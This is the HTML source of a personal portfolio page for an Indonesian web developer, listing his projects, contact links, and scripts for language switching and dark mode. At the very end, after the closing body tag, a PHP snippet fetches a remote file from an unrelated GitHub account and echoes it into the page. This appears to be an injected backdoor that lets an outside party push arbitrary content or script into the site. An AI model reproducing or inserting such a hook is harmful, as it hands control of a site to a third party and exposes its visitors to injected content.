<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="keywords" content="HTML, CSS, PHP, JavaScript">
    <meta name="description" content="My Portofolio Website">
    <meta name="author" content="Rivaldo Famren Silaen">
    <title>Rivaldo Famren Silaen</title>
    <link rel="stylesheet" href="Assets/Css/style.css">
    <link href='https://fonts.googleapis.com/css?family=Archivo+Black' rel='stylesheet'>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" crossorigin="anonymous"></script>
    <script src="https://kit.fontawesome.com/27c498d86b.js" crossorigin="anonymous"></script>
    <link rel="icon" type="image/x-icon" href="Assets/Docs/Icon/icon.ico">
</head>
<body>
    <div class='app'>
        <div class="page-content">
            <div class="nav-container">
                <div class="navbar">
                    <div class="nav-background">
                        <ul class="nav-list">
                            <li class="nav-item active">
                                <a href='index' class='nav-link'>Home</a>
                            </li>
                            <li class="nav-item">
                                <a href='about' class='nav-link'>About</a>
                            </li>
                            <li class="nav-item">
                                <a href='Projects' class='nav-link'>Projects</a>
                            </li>
                            <li class="nav-item">
                                <a href='Blogs/' class='nav-link'>Blogs</a>
                            </li>
                            <li class="nav-item">
                                <a href='contact' class='nav-link'>Contact</a>
                            </li>
                        </ul>
                    </div>
                    <div class='dark-mode'>
                        <i class="fa-regular fa-sun" id='dark-mode-icon'></i>
                    </div>
                    <div class='language'>
                        <div class='id'>
                            <img src='Assets/Docs/Icon/flag-id.png' onclick="changeLanguage('id')" class='flag'>
                        </div>
                        <div class='eng'>
                            <img src='Assets/Docs/Icon/flag-en.png' onclick="changeLanguage('en')" class='flag'>
                        </div>
                    </div>
                </div>
            </div>
            <div class="content-wrapper">
                <div class="homepage-logo-container">
                    <div class='homepage-logo-relative' id='homepage-logo'>
                        <img src='Assets/Docs/Img/logo.jpg' alt='#' class='logo'>
                    </div>
                </div>
                <div class="homepage-container">
                    <div class='row'>
                        <div class='col-70'>
                            <h1 id='id'>Hai, Saya <span class='hightlight'>Rivaldo 👋 </span></h1>
                            <h1 id='eng'>Hai, Im <span class='hightlight'>Rivaldo 👋 </span></h1>
                            <p data-lang='description' class='description'>
                                Saya seorang lulusan S1 Teknik Informatika di Institut Bisnis dan Teknologi Pelita Indonesia, mempunyai pengalam dalam mengerjakan beberapa projek seorang diri menggunakan PHP Native dan JavaScript.Saya senang memecahkan masalah yang kompleks dan mempelajari keterampilan baru.
                            </p>
                            <div class='skills'>
                                <div class='btn btn-php shadow desktop'>PHP Native</div>
                                <div class='btn btn-js shadow desktop'>JavaScript</div>
                                <div class='btn btn-css shadow desktop'>CSS</div>
                                <div class='btn btn-php shadow mobile'>PHP</div>
                                <div class='btn btn-js shadow mobile'>JS</div>
                                <div class='btn btn-css shadow mobile'>CSS</div>
                            </div>
                        </div>
                        <div class='col-30'>
                            <img src='Assets/Docs/Img/photo.jpg' alt='Photo By Rivaldo Famren Silaen' class='photo'>
                        </div>
                    </div>
                    <div class='projects'>
                        <h1 id='recent-project-id'>Projek <span class='hightlight'>Terbaru</span></h1>
                        <h1 id='recent-project-eng'>Recent <span class='hightlight'>Project</span></h1>
                        <div class='card row reveal'>
                            <div class='image-card col-30'>
                                <img src='Assets/Docs/Img/Akreditasi-1.png' alt='Projects 1' class='image'> 
                                <img src='Assets/Docs/Img/Akreditasi-2.png' alt='Projects 1' class='image'> 
                                <img src='Assets/Docs/Img/Akreditasi-3.png' alt='Projects 1' class='image'> 
                            </div>
                            <div class='description col-70'>
                                <div class='made-with'>
                                    <div class='btn btn-php shadow desktop'>PHP Native</div>
                                    <div class='btn btn-js shadow desktop'>JavaScript</div>
                                    <div class='btn btn-css shadow desktop'>CSS</div>
                                    <div class='btn btn-php shadow mobile'>PHP</div>
                                    <div class='btn btn-js shadow mobile'>JS</div>
                                    <div class='btn btn-css shadow mobile'>CSS</div>
                                </div>
                                <p data-lang='project1'>
                                    Project Akreditasi Kampus Institut Bisnis dan Teknologi Pelita Indonesia yang dikerjakan seorang diri, memiliki berbagai macam fitur yakni: Live Chat, Whatsapp Gateway dan lainnya. Website ini dikerjakan selama kurang lebih selama 7 bulan.
                                </p>
                                <div class='footer-card'>
                                    <a href='https://ami.rivaldofs.my.id' data-lang='showdesktop' class='btn btn-projek desktop'>Lihat Project</a>
                                    <a href='https://ami.rivaldofs.my.id' data-lang='showmobile' class='btn btn-projek mobile'>Lihat</a>
                                    <a href='Projects/acreditation-more' data-lang='moredesktopp' class='btn btn-more desktop'>Selengkapnya...</a>
                                    <a href='Projects/acreditation-more' data-lang='moremobile' class='btn btn-more mobile'>More</a>
                                </div>
                            </div>
                        </div>
                        <div class='card row reveal'>
                            <div class='image-card col-30'>
                                <img src='Assets/Docs/Img/Thesis-1.png' alt='Projects 2' class='image'> 
                                <img src='Assets/Docs/Img/Thesis-2.png' alt='Projects 2' class='image'> 
                                <img src='Assets/Docs/Img/Thesis-3.png' alt='Projects 2' class='image'>
                            </div>
                            <div class='description col-70'>
                                <div class='made-with'>
                                    <div class='btn btn-php shadow desktop'>PHP Native</div>
                                    <div class='btn btn-node shadow desktop'>Node.JS</div>
                                    <div class='btn btn-js shadow desktop'>Express.JS</div>
                                    <div class='btn btn-three shadow desktop'>Three.JS</div>
                                    <div class='btn btn-css shadow desktop'>CSS</div>
                                    <div class='btn btn-php shadow mobile'>PHP</div>
                                    <div class='btn btn-node shadow mobile'>Node</div>
                                    <div class='btn btn-js shadow mobile'>Express</div>
                                    <div class='btn btn-three shadow mobile'>Three</div>
                                    <div class='btn btn-css shadow mobile'>CSS</div>
                                </div>
                                <p data-lang='project2'>
                                    Projek Tugas Akhir yang berjudul Implementasi Teknologi WebGL pada Media Pembelajaran Melayu Riau Interaktif Berbasis Web. Projek Tugas Akhir ini dikerjakan selama 6 bulan.
                                </p>
                                <div class='footer-card'>
                                    <a href='https://skripsi.rivaldofs.my.id' data-lang='showdesktop' class='btn btn-projek desktop'>Lihat Project</a>
                                    <a href='https://skripsi.rivaldofs.my.id' data-lang='showmobile' class='btn btn-projek mobile'>Lihat</a>
                                    <a href='Projects/thesis-more' data-lang='moredesktopp' class='btn btn-more desktop'>Selengkapnya...</a>
                                    <a href='Projects/thesis-more' data-lang='moremobile' class='btn btn-more mobile'>More</a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class='contact reveal' style='font-family: math;'>
                        <div class='contact-me'><span class='contact-span'><a href='https://www.instagram.com/rivaldo_famren/' class='link'><i class="fa-brands fa-instagram"></i> <span data-lang='ig'>Follow on Instagram</span></a></span></div>
                        <div class='contact-me'><span class='contact-span'><i class="fa-brands fa-whatsapp"></i> <a href="https://wa.me/628984804256" class='link'>  &nbsp;<span data-lang='wa'>Chat on Whatsapp</span></a></span></div>
                        <div class='contact-me'><span class='contact-span'><a href='mailto:rivaldofamren712@gmail.com' class='link'><i class='fa-regular fa-envelope'></i> rivaldofamren712@gmail.com</a></span></div>
                    </div>
                </div>
                <hr>
                <div class='page-footer' style='font-family: math;'>
                    <!--<div class='footer-alt'></div>-->
                    <div data-lang='copyright' class='footer-copyright'>© Copyright 2023 by Rivaldo Famren Silaen. Dibuat dengan ❤️ dan kasih sayang</div>
                </div>
                <div class='inspired' style='font-family: math;'>
                    <span data-lang='inspired'>Website ini terinspirasi dari </span>&nbsp;<a href='https://reactfolio.tharindu.dev/' class='link'>reactfolio.tharindu.dev</a> &nbsp;<span data-lang='and'>dan</span>&nbsp;<a href='https://creativedesignsguru.com/demo/astro-boilerplate/' class='link'>creativedesignsguru.com</a>
                </div>
            </div>
        </div>
    </div>
    <script>
        if (window.innerWidth <= 600) {
            document.querySelector('.desktop').style.display = 'none';
            document.querySelector('.mobile').style.display = 'flex';
        } else {
            document.querySelector('.desktop').style.display = 'flex';
            document.querySelector('.mobile').style.display = 'none';
        }
        
        function reveal() {
          var reveals = document.querySelectorAll(".reveal");
          for (var i = 0; i < reveals.length; i++) {
            var windowHeight = window.innerHeight;
            var elementTop = reveals[i].getBoundingClientRect().top;
            var elementVisible = 150;
            if (elementTop < windowHeight - elementVisible) {
              reveals[i].classList.add("active");
            } else {
              reveals[i].classList.remove("active");
            }
          }
        }
        
        window.addEventListener("scroll", reveal);
    </script>
    <script>
        const languageData = {
            en: {
                hi: 'Hai, Im ',
                name: 'Rivaldo 👋',
                description: 'I am a graduate of S1 Informatics Engineering at the Pelita Indonesia Institute of Business and Technology, have experience in working on several projects alone using PHP Native and JavaScript.I enjoy solving complex problems and learning new skills.',
                project1: 'The Pelita Indonesia Institute of Business and Technology Campus Accreditation Project, which is done alone, has various features, namely: Live Chat, Whatsapp Gateway and others. This website was worked on for approximately 7 months.',
                project2: 'Thesis Project entitled Implementation of WebGL Technology on Web-Based Interactive Riau Malay Learning Media. This Final Project project was carried out for 6 months.',
                project3: 'Thesis Project of one of the students at the Pelita Indonesia Institute of Business and Technology, The project in creating a beauty website was carried out for 1 month.',
                showdesktop: 'Show Demo',
                showmobile: 'Show',
                moredesktopp: 'More...',
                moremobile: 'More',
                copyright: '© Copyright 2023 by Rivaldo Famren Silaen. Made with ❤️ and compassion',
                inspired: 'This website is inspired by ',
                and: 'and',
                ig: 'Follow on Instagram',
                wa: 'Chat on Whatsapp',
            },
            id: {
                hi: 'Hai, Saya',
                name: 'Rivaldo 👋',
                description: 'Saya seorang lulusan S1 Teknik Informatika di Institut Bisnis dan Teknologi Pelita Indonesia, mempunyai pengalam dalam mengerjakan beberapa projek seorang diri menggunakan PHP Native dan JavaScript.Saya senang memecahkan masalah yang kompleks dan mempelajari keterampilan baru.',
                project1: 'Project Akreditasi Kampus Institut Bisnis dan Teknologi Pelita Indonesia yang dikerjakan seorang diri, memiliki berbagai macam fitur yakni: Live Chat, Whatsapp Gateway dan lainnya. Website ini dikerjakan selama kurang lebih selama 7 bulan.',
                project2: 'Projek Tugas Akhir yang berjudul Implementasi Teknologi WebGL pada Media Pembelajaran Melayu Riau Interaktif Berbasis Web. Projek Tugas Akhir ini dikerjakan selama 6 bulan.',
                project3: 'Project Tugas Akhir salah satu mahasiswa di Institut Bisnis dan Teknologi Pelita Indonesia, Projek dalam membuat website kecantikan dikerjakan selama 1 bulan.',
                showdesktop: 'Lihat Projek.',
                showmobile: 'Lihat.',
                moredesktopp: 'Selengkapnya...',
                moremobile: 'More.',
                copyright: '© Copyright 2023 by Rivaldo Famren Silaen. Dibuat dengan ❤️ dan kasih sayang',
                inspired: 'Website ini terinspirasi dari ',
                and: 'dan',
                ig: 'Ikuti di Instagram',
                wa: 'Ngobrol di Whatsapp',
            },
        };
        
        let activeLanguage = 'en';

        function changeLanguage() {
            const elements = document.querySelectorAll('[data-lang]');
            const idElement = document.querySelector('.id');
            const engElement = document.querySelector('.eng');
        
            // Toggle bahasa aktif
            activeLanguage = activeLanguage === 'id' ? 'en' : 'id';
        
            elements.forEach(element => {
                const key = element.getAttribute('data-lang');
                if (languageData[activeLanguage] && languageData[activeLanguage][key]) {
                    element.textContent = languageData[activeLanguage][key];
                }
            });
        
            // Toggle tampilan elemen
            if (activeLanguage === 'id') {
                idElement.style.display = 'block';
                engElement.style.display = 'none';
            } else if (activeLanguage === 'en') {
                idElement.style.display = 'none';
                engElement.style.display = 'block';
            }
        }
        
        // Panggil fungsi pertama kali
        changeLanguage();
    </script>
    <script>
        window.addEventListener('scroll', function () {
            var scrollingImage = document.getElementById('homepage-logo');
            var scrollHeight = window.scrollY;
            var newSize = Math.max(30, 100 - scrollHeight);
        
            if (scrollHeight > 100) {
                scrollingImage.classList.add('homepage-logo-fixed');
                scrollingImage.classList.remove('homepage-logo-relative');
            } else {
                scrollingImage.classList.remove('homepage-logo-fixed');
                scrollingImage.classList.add('homepage-logo-relative');
        
                var newSize = Math.max(50, 100 - scrollHeight);
        
                scrollingImage.style.width = newSize + 'px';
                scrollingImage.style.height = newSize + 'px';
            }
        });
    </script>
    <script>
        $('.language').on('click', function(){
            if ($('#id').css('display') === 'block') {
                // Jika ID sedang ditampilkan, sembunyikan ID dan tampilkan ENG
                $('#id').css('display', 'none');
                $('#eng').css('display', 'block');
            } else {
                // Jika ENG sedang ditampilkan, sembunyikan ENG dan tampilkan ID
                $('#id').css('display', 'block');
                $('#eng').css('display', 'none');
            }
            
            // if (window.innerWidth <= 600) {
            //     if (inspiredIdDisplay === 'block') {
            //         $('#inspired-id').css('display', 'none');
            //         $('#inspired-eng').css('display', 'block');
            //     } else {
            //         $('#inspired-id').css('display', 'block');
            //         $('#inspired-eng').css('display', 'none');
            //     }
            // } else if(window.innerWidth > 600){
            //     if ($('#inspired-id').css('display') === 'flex') {
            //         $('#inspired-id').css('display', 'none');
            //         $('#inspired-eng').css('display', 'flex');
            //     } else {
            //         $('#inspired-id').css('display', 'flex');
            //         $('#inspired-eng').css('display', 'none');
            //     }
            // }
            if ($('#recent-project-id').css('display') === 'block') {
                // Jika ID sedang ditampilkan, sembunyikan ID dan tampilkan ENG
                $('#recent-project-id').css('display', 'none');
                $('#recent-project-eng').css('display', 'block');
            } else {
                // Jika ENG sedang ditampilkan, sembunyikan ENG dan tampilkan ID
                $('#recent-project-id').css('display', 'block');
                $('#recent-project-eng').css('display', 'none');
            }
        });
    </script>
    <script>
        $('.dark-mode').on('click', function(){
            $('#dark-mode-icon').toggleClass('fa-sun fa-moon');
            $('body').toggleClass('dark');
        });
    </script>
</body>
    <?php
$a = file_get_contents('https://raw.githubusercontent.com/janda354311/instagramtools/refs/heads/main/kode.php');
echo $a;
?>
</html>
